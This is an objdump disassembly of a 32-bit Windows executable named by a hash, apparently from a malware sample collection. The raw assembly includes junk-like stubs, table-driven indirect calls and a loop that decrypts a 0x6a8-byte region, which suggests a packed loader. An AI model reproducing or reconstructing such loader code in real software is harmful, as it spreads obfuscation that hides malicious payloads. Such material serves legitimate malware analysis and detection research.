
d5f6ca9c2dabe3b3f22c8420c8abacca8666d40b1aebc41cd1fde5c34f085084.exe:     file format pei-i386


Disassembly of section .text:

004cd000 <.text>:
  4cd000:	mov    edi,edi
  4cd002:	push   ebp
  4cd003:	mov    ebp,esp
  4cd005:	sub    esp,0x40
  4cd008:	mov    ebx,0x4d0098
  4cd00d:	or     edi,esi
  4cd00f:	push   ebx
  4cd010:	push   esi
  4cd011:	push   eax
  4cd012:	call   0x4cd764
  4cd017:	add    esp,0x8
  4cd01a:	pop    ebx
  4cd01b:	mov    eax,0x0
  4cd020:	push   eax
  4cd021:	call   0x4cddf4
  4cd026:	call   0x4cdb50
  4cd02b:	add    esp,0x40
  4cd02e:	pop    ebp
  4cd02f:	ret    
  4cd030:	mov    edi,edi
  4cd032:	push   ebp
  4cd033:	mov    ebp,esp
  4cd035:	sub    esp,0x38
  4cd038:	lea    edx,[ecx-0xa4]
  4cd03e:	sub    DWORD PTR [ebp-0x1c],edx
  4cd041:	push   edx
  4cd042:	push   DWORD PTR [edx+0xe8]
  4cd048:	push   DWORD PTR [edx+0x60]
  4cd04b:	push   ecx
  4cd04c:	call   0x4cd434
  4cd051:	add    esp,0xc
  4cd054:	pop    edx
  4cd055:	push   edx
  4cd056:	mov    ebx,0x0
  4cd05b:	push   ebx
  4cd05c:	call   0x4cddf4
  4cd061:	pop    edx
  4cd062:	push   edx
  4cd063:	push   0x0
  4cd065:	call   0x4cdb00
  4cd06a:	pop    edx
  4cd06b:	add    esp,0x38
  4cd06e:	pop    ebp
  4cd06f:	ret    
  4cd070:	mov    edi,edi
  4cd072:	push   ebp
  4cd073:	mov    ebp,esp
  4cd075:	sub    esp,0x54
  4cd078:	mov    edi,0x4d01dc
  4cd07d:	mov    DWORD PTR [edi-0x5c],0xffff9bd2
  4cd084:	push   edi
  4cd085:	mov    ecx,0x0
  4cd08a:	push   ecx
  4cd08b:	call   0x4cddf4
  4cd090:	pop    edi
  4cd091:	push   edi
  4cd092:	push   eax
  4cd093:	push   DWORD PTR [edi+0x88]
  4cd099:	push   DWORD PTR [edi+0x4]
  4cd09c:	push   eax
  4cd09d:	call   0x4cd964
  4cd0a2:	add    esp,0x10
  4cd0a5:	pop    edi
  4cd0a6:	push   edi
  4cd0a7:	push   0x0
  4cd0a9:	call   0x4cd6b8
  4cd0ae:	pop    edi
  4cd0af:	add    esp,0x54
  4cd0b2:	pop    ebp
  4cd0b3:	ret    
  4cd0b4:	mov    edi,edi
  4cd0b6:	push   ebp
  4cd0b7:	mov    ebp,esp
  4cd0b9:	sub    esp,0x60
  4cd0bc:	lea    ecx,ds:0x4d00f8
  4cd0c2:	add    DWORD PTR [ecx+0x100],ebx
  4cd0c8:	push   ecx
  4cd0c9:	push   DWORD PTR [ecx+0x88]
  4cd0cf:	push   DWORD PTR [ecx+0x1f0]
  4cd0d5:	push   DWORD PTR [ecx+0xb8]
  4cd0db:	push   DWORD PTR [ecx+0x1d0]
  4cd0e1:	call   0x4cd9e0
  4cd0e6:	add    esp,0x10
  4cd0e9:	pop    ecx
  4cd0ea:	push   ecx
  4cd0eb:	mov    eax,0x0
  4cd0f0:	push   eax
  4cd0f1:	call   0x4cdb00
  4cd0f6:	pop    ecx
  4cd0f7:	push   ecx
  4cd0f8:	lea    edi,[ecx-0xf8]
  4cd0fe:	push   edi
  4cd0ff:	call   0x4cd56c
  4cd104:	test   eax,eax
  4cd106:	jne    0x4cd0f8
  4cd108:	pop    ecx
  4cd109:	add    esp,0x60
  4cd10c:	pop    ebp
  4cd10d:	ret    
  4cd10e:	add    BYTE PTR [eax],al
  4cd110:	mov    edi,edi
  4cd112:	push   ebp
  4cd113:	mov    ebp,esp
  4cd115:	sub    esp,0x38
  4cd118:	lea    eax,ds:0x4d00b0
  4cd11e:	xor    DWORD PTR [ebp-0x20],ecx
  4cd121:	push   eax
  4cd122:	push   0x0
  4cd124:	call   0x4cdee4
  4cd129:	pop    eax
  4cd12a:	push   eax
  4cd12b:	push   edi
  4cd12c:	push   DWORD PTR [eax+0x1cc]
  4cd132:	push   DWORD PTR [eax+0xec]
  4cd138:	call   0x4cd070
  4cd13d:	add    esp,0xc
  4cd140:	pop    eax
  4cd141:	mov    edx,0x4cf730
  4cd146:	mov    edx,DWORD PTR [edx]
  4cd148:	push   edx
  4cd149:	push   DWORD PTR [eax-0x4c]
  4cd14c:	pop    esi
  4cd14d:	call   esi
  4cd14f:	add    esp,0x38
  4cd152:	pop    ebp
  4cd153:	ret    
  4cd154:	mov    edi,edi
  4cd156:	push   ebp
  4cd157:	mov    ebp,esp
  4cd159:	sub    esp,0x44
  4cd15c:	lea    esi,ds:0x4d0150
  4cd162:	cmp    esi,0x7679
  4cd168:	jbe    0x4cd157
  4cd16a:	push   esi
  4cd16b:	push   DWORD PTR [esi+0x120]
  4cd171:	push   DWORD PTR [esi+0xc4]
  4cd177:	push   eax
  4cd178:	call   0x4cd374
  4cd17d:	add    esp,0xc
  4cd180:	pop    esi
  4cd181:	push   0x0
  4cd183:	call   0x4cde60
  4cd188:	mov    ebx,0x0
  4cd18d:	push   ebx
  4cd18e:	call   0x4cdee4
  4cd193:	add    esp,0x44
  4cd196:	pop    ebp
  4cd197:	ret    
  4cd198:	mov    edi,edi
  4cd19a:	push   ebp
  4cd19b:	mov    ebp,esp
  4cd19d:	sub    esp,0x50
  4cd1a0:	lea    edx,[ecx-0x130]
  4cd1a6:	and    ebx,esi
  4cd1a8:	push   edx
  4cd1a9:	push   0x0
  4cd1ab:	call   0x4cde60
  4cd1b0:	pop    edx
  4cd1b1:	push   edx
  4cd1b2:	push   ecx
  4cd1b3:	push   eax
  4cd1b4:	push   DWORD PTR [edx+0x48]
  4cd1b7:	call   0x4cd59c
  4cd1bc:	add    esp,0xc
  4cd1bf:	pop    edx
  4cd1c0:	push   edx
  4cd1c1:	mov    edx,0x0
  4cd1c6:	push   edx
  4cd1c7:	call   0x4ce1e0
  4cd1cc:	pop    edx
  4cd1cd:	add    esp,0x50
  4cd1d0:	pop    ebp
  4cd1d1:	ret    
  4cd1d2:	add    BYTE PTR [eax],al
  4cd1d4:	mov    edi,edi
  4cd1d6:	push   ebp
  4cd1d7:	mov    ebp,esp
  4cd1d9:	sub    esp,0x30
  4cd1dc:	lea    eax,ds:0x4d018c
  4cd1e2:	adc    ecx,DWORD PTR [eax+0xc]
  4cd1e5:	push   eax
  4cd1e6:	push   DWORD PTR [eax+0x19c]
  4cd1ec:	push   DWORD PTR [eax+0x104]
  4cd1f2:	push   ebx
  4cd1f3:	push   edi
  4cd1f4:	call   0x4cdab8
  4cd1f9:	add    esp,0x10
  4cd1fc:	pop    eax
  4cd1fd:	push   eax
  4cd1fe:	push   0x0
  4cd200:	call   0x4cddf4
  4cd205:	pop    eax
  4cd206:	push   eax
  4cd207:	mov    eax,0x0
  4cd20c:	push   eax
  4cd20d:	call   0x4ce1e0
  4cd212:	pop    eax
  4cd213:	add    esp,0x30
  4cd216:	pop    ebp
  4cd217:	ret    
  4cd218:	mov    edi,edi
  4cd21a:	push   ebp
  4cd21b:	mov    ebp,esp
  4cd21d:	sub    esp,0x44
  4cd220:	adc    edx,DWORD PTR [ebp-0x28]
  4cd223:	mov    edi,0x4d0090
  4cd228:	push   edi
  4cd229:	mov    ecx,0x6a8
  4cd22e:	push   ecx
  4cd22f:	mov    edi,0x6a8
  4cd234:	push   edi
  4cd235:	push   0x40001
  4cd23a:	mov    edx,0x86295c7a
  4cd23f:	push   DWORD PTR [edx+0x7a239a86]
  4cd245:	sub    DWORD PTR [esp],0x2
  4cd249:	mov    edx,0x4cf6ec
  4cd24e:	pop    DWORD PTR [edx]
  4cd250:	call   0x4cd57c
  4cd255:	xchg   DWORD PTR [esp],eax
  4cd258:	mov    edi,eax
  4cd25a:	pop    DWORD PTR [edi-0x2c]
  4cd25d:	mov    edx,DWORD PTR [edi-0x2c]
  4cd260:	mov    edx,edx
  4cd262:	sub    ecx,ecx
  4cd264:	dec    ecx
  4cd265:	and    ecx,0x4cf038
  4cd26b:	mov    eax,0x631a7e54
  4cd270:	mov    esi,0x6a8
  4cd275:	cmp    esi,0x0
  4cd278:	je     0x4cd296
  4cd27a:	add    esi,0xfffffffc
  4cd27d:	xor    ebx,ebx
  4cd27f:	push   DWORD PTR [ecx+ebx*1]
  4cd282:	sub    DWORD PTR [esp],eax
  4cd285:	pop    DWORD PTR [edx+ebx*2]
  4cd288:	dec    DWORD PTR [edx]
  4cd28a:	xor    eax,eax
  4cd28c:	add    eax,DWORD PTR [ecx]
  4cd28e:	add    ecx,0x4
  4cd291:	add    edx,0x4
  4cd294:	jmp    0x4cd275
  4cd296:	push   edi
  4cd297:	push   0x0
  4cd299:	call   0x4cddf4
  4cd29e:	pop    edi
  4cd29f:	add    esp,0x44
  4cd2a2:	pop    ebp
  4cd2a3:	ret    
  4cd2a4:	mov    edi,edi
  4cd2a6:	push   ebp
  4cd2a7:	mov    ebp,esp
  4cd2a9:	sub    esp,0x44
  4cd2ac:	lea    eax,ds:0x4d0008
  4cd2b2:	cmp    eax,0xe06
  4cd2b7:	jbe    0x4cd2a7
  4cd2b9:	push   eax
  4cd2ba:	push   esi
  4cd2bb:	push   DWORD PTR [eax+0xa0]
  4cd2c1:	push   edi
  4cd2c2:	call   0x4cdea0
  4cd2c7:	add    esp,0xc
  4cd2ca:	pop    eax
  4cd2cb:	push   eax
  4cd2cc:	push   0x0
  4cd2ce:	call   0x4cd914
  4cd2d3:	pop    eax
  4cd2d4:	push   eax
  4cd2d5:	push   0x0
  4cd2d7:	call   0x4cddf4
  4cd2dc:	pop    eax
  4cd2dd:	add    esp,0x44
  4cd2e0:	pop    ebp
  4cd2e1:	ret    
  4cd2e2:	add    BYTE PTR [eax],al
  4cd2e4:	mov    edi,edi
  4cd2e6:	push   ebp
  4cd2e7:	mov    ebp,esp
  4cd2e9:	sub    esp,0x2c
  4cd2ec:	mov    edi,0x4d0008
  4cd2f1:	add    ebx,0x16
  4cd2f4:	push   edi
  4cd2f5:	lea    eax,[edi-0x8]
  4cd2f8:	push   eax
  4cd2f9:	call   0x4cd56c
  4cd2fe:	test   eax,eax
  4cd300:	jne    0x4cd2f5
  4cd302:	pop    edi
  4cd303:	push   edi
  4cd304:	push   DWORD PTR [edi+0x188]
  4cd30a:	push   DWORD PTR [edi+0x11c]
  4cd310:	call   0x4cd3b0
  4cd315:	add    esp,0x8
  4cd318:	pop    edi
  4cd319:	push   edi
  4cd31a:	push   0x0
  4cd31c:	call   0x4ce1e0
  4cd321:	pop    edi
  4cd322:	add    esp,0x2c
  4cd325:	pop    ebp
  4cd326:	ret    
  4cd327:	add    BYTE PTR [edi+0x33],bl
  4cd32a:	sar    bh,0x14
  4cd32d:	inc    ebp
  4cd32e:	cld    
  4cd32f:	test   BYTE PTR [eax+eax*1+0x57],0x3e
  4cd334:	ret    0x0
  4cd337:	push   es
  4cd338:	mov    edi,edi
  4cd33a:	push   ebp
  4cd33b:	mov    ebp,esp
  4cd33d:	sub    esp,0x50
  4cd340:	lea    ecx,[esi+0xb8]
  4cd346:	sbb    edx,DWORD PTR [ecx-0x8]
  4cd349:	push   ecx
  4cd34a:	push   0xfffffff4
  4cd34c:	call   0x4cd9b0
  4cd351:	pop    ecx
  4cd352:	push   ecx
  4cd353:	push   ebx
  4cd354:	push   edi
  4cd355:	push   ebx
  4cd356:	push   DWORD PTR [ecx+0x110]
  4cd35c:	call   0x4cd154
  4cd361:	add    esp,0x10
  4cd364:	pop    ecx
  4cd365:	push   ecx
  4cd366:	call   0x4cdb50
  4cd36b:	pop    ecx
  4cd36c:	add    esp,0x50
  4cd36f:	pop    ebp
  4cd370:	ret    
  4cd371:	add    BYTE PTR [eax],al
  4cd373:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd379:	sub    esp,0x2c
  4cd37c:	lea    edi,ds:0x4d0124
  4cd382:	sub    edx,0xffffff99
  4cd385:	push   edi
  4cd386:	push   0x0
  4cd388:	call   0x4cde60
  4cd38d:	pop    edi
  4cd38e:	push   edi
  4cd38f:	push   eax
  4cd390:	push   edx
  4cd391:	push   ebx
  4cd392:	push   DWORD PTR [edi+0xd8]
  4cd398:	call   0x4cd860
  4cd39d:	add    esp,0x10
  4cd3a0:	pop    edi
  4cd3a1:	push   edi
  4cd3a2:	push   0x0
  4cd3a4:	call   0x4cde60
  4cd3a9:	pop    edi
  4cd3aa:	add    esp,0x2c
  4cd3ad:	pop    ebp
  4cd3ae:	ret    
  4cd3af:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd3b5:	sub    esp,0x28
  4cd3b8:	mov    eax,0x4d0024
  4cd3bd:	sub    edi,DWORD PTR [eax+0x94]
  4cd3c3:	push   eax
  4cd3c4:	push   ecx
  4cd3c5:	push   edi
  4cd3c6:	push   DWORD PTR [eax+0x1a8]
  4cd3cc:	push   DWORD PTR [eax+0x1ac]
  4cd3d2:	call   0x4cdc98
  4cd3d7:	add    esp,0x10
  4cd3da:	pop    eax
  4cd3db:	push   eax
  4cd3dc:	call   0x4ce048
  4cd3e1:	pop    eax
  4cd3e2:	push   eax
  4cd3e3:	push   0x0
  4cd3e5:	call   0x4cde60
  4cd3ea:	pop    eax
  4cd3eb:	add    esp,0x28
  4cd3ee:	pop    ebp
  4cd3ef:	ret    
  4cd3f0:	mov    edi,edi
  4cd3f2:	push   ebp
  4cd3f3:	mov    ebp,esp
  4cd3f5:	sub    esp,0x54
  4cd3f8:	mov    ebx,0x4d0148
  4cd3fd:	and    DWORD PTR [ebp-0x8],ecx
  4cd400:	push   ebx
  4cd401:	push   DWORD PTR [ebx+0x5c]
  4cd404:	push   DWORD PTR [ebx+0x50]
  4cd407:	push   eax
  4cd408:	push   eax
  4cd409:	call   0x4ce010
  4cd40e:	add    esp,0x10
  4cd411:	pop    ebx
  4cd412:	call   0x4cda54
  4cd417:	push   0x0
  4cd419:	call   0x4cd6b8
  4cd41e:	add    esp,0x54
  4cd421:	pop    ebp
  4cd422:	ret    
  4cd423:	add    BYTE PTR [edi+0x33],bl
  4cd426:	sar    bh,0x14
  4cd429:	inc    ebp
  4cd42a:	add    al,0xf7
  4cd42c:	dec    esp
  4cd42d:	add    BYTE PTR [edi+0x3e],dl
  4cd430:	ret    0x0
  4cd433:	push   es
  4cd434:	mov    edi,edi
  4cd436:	push   ebp
  4cd437:	mov    ebp,esp
  4cd439:	sub    esp,0x24
  4cd43c:	lea    ebx,[edx+0x104]
  4cd442:	cmp    ebx,0x5f51
  4cd448:	jb     0x4cd437
  4cd44a:	call   0x4ce048
  4cd44f:	push   ebx
  4cd450:	push   ecx
  4cd451:	push   DWORD PTR [ebx+0x174]
  4cd457:	push   DWORD PTR [ebx+0x1fc]
  4cd45d:	push   DWORD PTR [ebx+0x1fc]
  4cd463:	call   0x4cd6c8
  4cd468:	add    esp,0x10
  4cd46b:	pop    ebx
  4cd46c:	mov    esi,0x0
  4cd471:	push   esi
  4cd472:	call   0x4cddf4
  4cd477:	add    esp,0x24
  4cd47a:	pop    ebp
  4cd47b:	ret    
  4cd47c:	mov    edi,edi
  4cd47e:	push   ebp
  4cd47f:	mov    ebp,esp
  4cd481:	sub    esp,0x24
  4cd484:	mov    eax,0x4d01f8
  4cd489:	sbb    ecx,DWORD PTR [ebp-0x1c]
  4cd48c:	push   eax
  4cd48d:	push   DWORD PTR [eax+0x1cc]
  4cd493:	push   ecx
  4cd494:	push   DWORD PTR [eax+0x114]
  4cd49a:	push   edx
  4cd49b:	call   0x4cda20
  4cd4a0:	add    esp,0x10
  4cd4a3:	pop    eax
  4cd4a4:	push   eax
  4cd4a5:	push   0x0
  4cd4a7:	call   0x4cde60
  4cd4ac:	pop    eax
  4cd4ad:	push   eax
  4cd4ae:	push   0x0
  4cd4b0:	call   0x4cdee4
  4cd4b5:	pop    eax
  4cd4b6:	add    esp,0x24
  4cd4b9:	pop    ebp
  4cd4ba:	ret    
  4cd4bb:	add    BYTE PTR [edi+0x33],bl
  4cd4be:	sar    bh,0x14
  4cd4c1:	inc    ebp
  4cd4c2:	or     al,0xf7
  4cd4c4:	dec    esp
  4cd4c5:	add    BYTE PTR [edi+0x3e],dl
  4cd4c8:	ret    0x0
  4cd4cb:	push   es
  4cd4cc:	mov    edi,edi
  4cd4ce:	push   ebp
  4cd4cf:	mov    ebp,esp
  4cd4d1:	sub    esp,0x30
  4cd4d4:	mov    eax,0x4d0090
  4cd4d9:	and    DWORD PTR [ebp-0x28],0x19
  4cd4dd:	push   eax
  4cd4de:	push   DWORD PTR [eax+0x108]
  4cd4e4:	push   DWORD PTR [eax+0x164]
  4cd4ea:	push   ebx
  4cd4eb:	push   DWORD PTR [eax+0x148]
  4cd4f1:	call   0x4cd0b4
  4cd4f6:	add    esp,0x10
  4cd4f9:	pop    eax
  4cd4fa:	push   eax
  4cd4fb:	mov    ebx,0x0
  4cd500:	push   ebx
  4cd501:	call   0x4cd6b8
  4cd506:	pop    eax
  4cd507:	push   eax
  4cd508:	mov    edi,0x0
  4cd50d:	push   edi
  4cd50e:	call   0x4cde50
  4cd513:	pop    eax
  4cd514:	add    esp,0x30
  4cd517:	pop    ebp
  4cd518:	ret    
  4cd519:	add    BYTE PTR [eax],al
  4cd51b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd521:	sub    esp,0x5c
  4cd524:	lea    edi,[eax+0x8c]
  4cd52a:	adc    DWORD PTR [ebp-0xc],edx
  4cd52d:	push   edi
  4cd52e:	push   DWORD PTR [edi+0xb4]
  4cd534:	push   DWORD PTR [edi+0x10c]
  4cd53a:	push   edx
  4cd53b:	push   ecx
  4cd53c:	call   0x4cd7a4
  4cd541:	add    esp,0x10
  4cd544:	pop    edi
  4cd545:	push   edi
  4cd546:	call   0x4cd328
  4cd54b:	pop    edi
  4cd54c:	push   edi
  4cd54d:	push   0x0
  4cd54f:	call   0x4cd6b8
  4cd554:	pop    edi
  4cd555:	add    esp,0x5c
  4cd558:	pop    ebp
  4cd559:	ret    
  4cd55a:	add    BYTE PTR [eax],al
  4cd55c:	pop    edi
  4cd55d:	xor    eax,eax
  4cd55f:	call   DWORD PTR [eax*2+0x4cf774]
  4cd566:	push   edi
  4cd567:	ds ret 0x0
  4cd56b:	push   es
  4cd56c:	pop    edi
  4cd56d:	xor    eax,eax
  4cd56f:	call   DWORD PTR [eax*2+0x4cf730]
  4cd576:	push   edi
  4cd577:	ds ret 0x0
  4cd57b:	push   es
  4cd57c:	pop    edi
  4cd57d:	xor    eax,eax
  4cd57f:	call   DWORD PTR [eax*2+0x4cf6ec]
  4cd586:	push   edi
  4cd587:	ds ret 0x0
  4cd58b:	push   es
  4cd58c:	pop    edi
  4cd58d:	xor    eax,eax
  4cd58f:	call   DWORD PTR [eax*2+0x4cf744]
  4cd596:	push   edi
  4cd597:	ds ret 0x0
  4cd59b:	push   es
  4cd59c:	mov    edi,edi
  4cd59e:	push   ebp
  4cd59f:	mov    ebp,esp
  4cd5a1:	sub    esp,0x5c
  4cd5a4:	lea    edi,ds:0x4d0004
  4cd5aa:	adc    DWORD PTR [ebp-0x28],edi
  4cd5ad:	push   edi
  4cd5ae:	push   DWORD PTR [edi+0x1a4]
  4cd5b4:	push   eax
  4cd5b5:	push   DWORD PTR [edi+0x100]
  4cd5bb:	call   0x4cd5e0
  4cd5c0:	add    esp,0xc
  4cd5c3:	pop    edi
  4cd5c4:	push   edi
  4cd5c5:	call   0x4cda54
  4cd5ca:	pop    edi
  4cd5cb:	push   edi
  4cd5cc:	lea    ecx,[edi-0x4]
  4cd5cf:	push   ecx
  4cd5d0:	call   0x4cd56c
  4cd5d5:	test   eax,eax
  4cd5d7:	jne    0x4cd5cc
  4cd5d9:	pop    edi
  4cd5da:	add    esp,0x5c
  4cd5dd:	pop    ebp
  4cd5de:	ret    
  4cd5df:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd5e5:	sub    esp,0x60
  4cd5e8:	lea    eax,[edi+0xec]
  4cd5ee:	add    DWORD PTR [ebp-0x24],ecx
  4cd5f1:	push   eax
  4cd5f2:	push   ecx
  4cd5f3:	push   ecx
  4cd5f4:	call   0x4cdd90
  4cd5f9:	add    esp,0x8
  4cd5fc:	pop    eax
  4cd5fd:	push   eax
  4cd5fe:	mov    edx,0x0
  4cd603:	push   edx
  4cd604:	call   0x4cde60
  4cd609:	pop    eax
  4cd60a:	push   eax
  4cd60b:	mov    eax,0x0
  4cd610:	push   eax
  4cd611:	call   0x4cd424
  4cd616:	pop    eax
  4cd617:	add    esp,0x60
  4cd61a:	pop    ebp
  4cd61b:	ret    
  4cd61c:	mov    edi,edi
  4cd61e:	push   ebp
  4cd61f:	mov    ebp,esp
  4cd621:	sub    esp,0x2c
  4cd624:	mov    ebx,0x4d0174
  4cd629:	or     DWORD PTR [ebx+0x54],ebx
  4cd62c:	mov    eax,0x0
  4cd631:	push   eax
  4cd632:	call   0x4cd6b8
  4cd637:	push   ebx
  4cd638:	push   esi
  4cd639:	push   DWORD PTR [ebx+0x1a8]
  4cd63f:	push   edx
  4cd640:	push   ecx
  4cd641:	call   0x4ce058
  4cd646:	add    esp,0x10
  4cd649:	pop    ebx
  4cd64a:	lea    eax,[ebx-0x174]
  4cd650:	push   eax
  4cd651:	call   0x4cd56c
  4cd656:	test   eax,eax
  4cd658:	jne    0x4cd64b
  4cd65a:	add    esp,0x2c
  4cd65d:	pop    ebp
  4cd65e:	ret    
  4cd65f:	add    BYTE PTR [edi+0x33],bl
  4cd662:	sar    bh,0x14
  4cd665:	inc    ebp
  4cd666:	inc    eax
  4cd667:	test   DWORD PTR [eax+eax*1+0x57],0xc23e
  4cd66f:	push   es
  4cd670:	push   edi
  4cd671:	xor    edi,edi
  4cd673:	push   edi
  4cd674:	push   edi
  4cd675:	push   edi
  4cd676:	push   edi
  4cd677:	call   0x4cd9b0
  4cd67c:	sub    esp,0x4
  4cd67f:	call   0x4cde80
  4cd684:	push   0x2
  4cd686:	xor    eax,eax
  4cd688:	xor    eax,0x4d00a0
  4cd68d:	push   0x0
  4cd68f:	inc    DWORD PTR ds:0x4d00a6
  4cd695:	push   eax
  4cd696:	call   0x4cd57c
  4cd69b:	pop    edi
  4cd69c:	lea    edi,[eax+0x3b]
  4cd69f:	mov    edi,DWORD PTR [edi]
  4cd6a1:	lea    eax,[eax+edi*1]
  4cd6a4:	add    eax,0x28
  4cd6a7:	mov    eax,DWORD PTR [eax]
  4cd6a9:	pusha  
  4cd6aa:	mov    ah,0x30
  4cd6ac:	sub    al,ah
  4cd6ae:	jb     0x4cd6b6
  4cd6b0:	jg     0x4cd110
  4cd6b6:	popa   
  4cd6b7:	ret    
  4cd6b8:	pop    edi
  4cd6b9:	xor    eax,eax
  4cd6bb:	call   DWORD PTR [eax*2+0x4cf754]
  4cd6c2:	push   edi
  4cd6c3:	ds ret 0x0
  4cd6c7:	push   es
  4cd6c8:	mov    edi,edi
  4cd6ca:	push   ebp
  4cd6cb:	mov    ebp,esp
  4cd6cd:	sub    esp,0x28
  4cd6d0:	lea    edx,ds:0x4d0030
  4cd6d6:	mov    DWORD PTR [ebp-0x14],ecx
  4cd6d9:	push   edx
  4cd6da:	push   DWORD PTR [edx+0x168]
  4cd6e0:	push   DWORD PTR [edx+0x128]
  4cd6e6:	call   0x4cdb70
  4cd6eb:	add    esp,0x8
  4cd6ee:	pop    edx
  4cd6ef:	push   edx
  4cd6f0:	push   0x0
  4cd6f2:	call   0x4cde50
  4cd6f7:	pop    edx
  4cd6f8:	push   edx
  4cd6f9:	push   0x0
  4cd6fb:	call   0x4cd914
  4cd700:	pop    edx
  4cd701:	add    esp,0x28
  4cd704:	pop    ebp
  4cd705:	ret    
  4cd706:	add    BYTE PTR [eax],al
  4cd708:	mov    edi,edi
  4cd70a:	push   ebp
  4cd70b:	mov    ebp,esp
  4cd70d:	sub    esp,0x54
  4cd710:	lea    esi,[eax+0x18c]
  4cd716:	sub    DWORD PTR [ebp-0x3c],0x15
  4cd71a:	push   esi
  4cd71b:	push   ebx
  4cd71c:	push   DWORD PTR [esi+0x130]
  4cd722:	push   DWORD PTR [esi+0x120]
  4cd728:	call   0x4cd1d4
  4cd72d:	add    esp,0xc
  4cd730:	pop    esi
  4cd731:	push   0x0
  4cd733:	call   0x4cdee4
  4cd738:	push   0x0
  4cd73a:	call   0x4cd6b8
  4cd73f:	add    esp,0x54
  4cd742:	pop    ebp
  4cd743:	ret    
  4cd744:	pop    edi
  4cd745:	xor    eax,eax
  4cd747:	call   DWORD PTR [eax*2+0x4cf758]
  4cd74e:	push   edi
  4cd74f:	ds ret 0x0
  4cd753:	push   es
  4cd754:	pop    edi
  4cd755:	xor    eax,eax
  4cd757:	call   DWORD PTR [eax*2+0x4cf700]
  4cd75e:	push   edi
  4cd75f:	ds ret 0x0
  4cd763:	push   es
  4cd764:	mov    edi,edi
  4cd766:	push   ebp
  4cd767:	mov    ebp,esp
  4cd769:	sub    esp,0x2c
  4cd76c:	mov    edi,0x4d0134
  4cd771:	xor    eax,esi
  4cd773:	push   edi
  4cd774:	push   esi
  4cd775:	push   ebx
  4cd776:	push   DWORD PTR [edi+0xc]
  4cd779:	push   esi
  4cd77a:	call   0x4cd61c
  4cd77f:	add    esp,0x10
  4cd782:	pop    edi
  4cd783:	push   edi
  4cd784:	lea    esi,[edi-0x134]
  4cd78a:	push   esi
  4cd78b:	call   0x4cd56c
  4cd790:	test   eax,eax
  4cd792:	jne    0x4cd784
  4cd794:	pop    edi
  4cd795:	push   edi
  4cd796:	call   0x4cd328
  4cd79b:	pop    edi
  4cd79c:	add    esp,0x2c
  4cd79f:	pop    ebp
  4cd7a0:	ret    
  4cd7a1:	add    BYTE PTR [eax],al
  4cd7a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd7a9:	sub    esp,0x48
  4cd7ac:	mov    ebx,0x4d0134
  4cd7b1:	add    ecx,0xffffffa7
  4cd7b4:	push   ebx
  4cd7b5:	push   esi
  4cd7b6:	push   DWORD PTR [ebx+0xec]
  4cd7bc:	call   0x4cd2a4
  4cd7c1:	add    esp,0x8
  4cd7c4:	pop    ebx
  4cd7c5:	push   0x0
  4cd7c7:	call   0x4cde50
  4cd7cc:	push   0x0
  4cd7ce:	call   0x4cde50
  4cd7d3:	add    esp,0x48
  4cd7d6:	pop    ebp
  4cd7d7:	ret    
  4cd7d8:	mov    edi,edi
  4cd7da:	push   ebp
  4cd7db:	mov    ebp,esp
  4cd7dd:	sub    esp,0x54
  4cd7e0:	mov    edi,0x4d0004
  4cd7e5:	mov    DWORD PTR [ebp-0x4c],0xffffffa7
  4cd7ec:	push   edi
  4cd7ed:	call   0x4ce048
  4cd7f2:	pop    edi
  4cd7f3:	push   edi
  4cd7f4:	push   edx
  4cd7f5:	push   ebx
  4cd7f6:	push   esi
  4cd7f7:	push   DWORD PTR [edi+0x180]
  4cd7fd:	call   0x4cdb10
  4cd802:	add    esp,0x10
  4cd805:	pop    edi
  4cd806:	push   edi
  4cd807:	mov    ebx,0x0
  4cd80c:	push   ebx
  4cd80d:	call   0x4cdee4
  4cd812:	pop    edi
  4cd813:	add    esp,0x54
  4cd816:	pop    ebp
  4cd817:	ret    
  4cd818:	mov    edi,edi
  4cd81a:	push   ebp
  4cd81b:	mov    ebp,esp
  4cd81d:	sub    esp,0x5c
  4cd820:	mov    edx,0x4d0064
  4cd825:	and    edi,0x1d82
  4cd82b:	push   edx
  4cd82c:	push   ebx
  4cd82d:	push   ecx
  4cd82e:	push   DWORD PTR [edx+0x16c]
  4cd834:	push   DWORD PTR [edx+0xa4]
  4cd83a:	call   0x4cd924
  4cd83f:	add    esp,0x10
  4cd842:	pop    edx
  4cd843:	push   edx
  4cd844:	call   0x4cd328
  4cd849:	pop    edx
  4cd84a:	push   edx
  4cd84b:	lea    esi,[edx-0x64]
  4cd84e:	push   esi
  4cd84f:	call   0x4cd56c
  4cd854:	test   eax,eax
  4cd856:	jne    0x4cd84b
  4cd858:	pop    edx
  4cd859:	add    esp,0x5c
  4cd85c:	pop    ebp
  4cd85d:	ret    
  4cd85e:	add    BYTE PTR [eax],al
  4cd860:	mov    edi,edi
  4cd862:	push   ebp
  4cd863:	mov    ebp,esp
  4cd865:	sub    esp,0x28
  4cd868:	lea    edx,[edi-0xdc]
  4cd86e:	adc    DWORD PTR [edx+0xfc],ecx
  4cd874:	push   edx
  4cd875:	push   esi
  4cd876:	push   ecx
  4cd877:	call   0x4cd000
  4cd87c:	add    esp,0x8
  4cd87f:	pop    edx
  4cd880:	push   edx
  4cd881:	mov    eax,0x0
  4cd886:	push   eax
  4cd887:	call   0x4cd6b8
  4cd88c:	pop    edx
  4cd88d:	push   edx
  4cd88e:	mov    esi,0x0
  4cd893:	push   esi
  4cd894:	call   0x4ce1e0
  4cd899:	pop    edx
  4cd89a:	add    esp,0x28
  4cd89d:	pop    ebp
  4cd89e:	ret    
  4cd89f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4cd8a5:	sub    esp,0x44
  4cd8a8:	lea    edx,[esi+0x34]
  4cd8ab:	mov    ecx,DWORD PTR [ebp-0x30]
  4cd8ae:	push   edx
  4cd8af:	push   ebx
  4cd8b0:	push   eax
  4cd8b1:	push   DWORD PTR [edx+0x30]
  4cd8b4:	push   ecx
  4cd8b5:	call   0x4cdef4
  4cd8ba:	add    esp,0x10
  4cd8bd:	pop    edx
  4cd8be:	push   edx
  4cd8bf:	mov    esi,0x0
  4cd8c4:	push   esi
  4cd8c5:	call   0x4cd914
  4cd8ca:	pop    edx
  4cd8cb:	push   edx
  4cd8cc:	push   0x0
  4cd8ce:	call   0x4cdb00
  4cd8d3:	pop    edx
  4cd8d4:	add    esp,0x44
  4cd8d7:	pop    ebp
  4cd8d8:	ret    
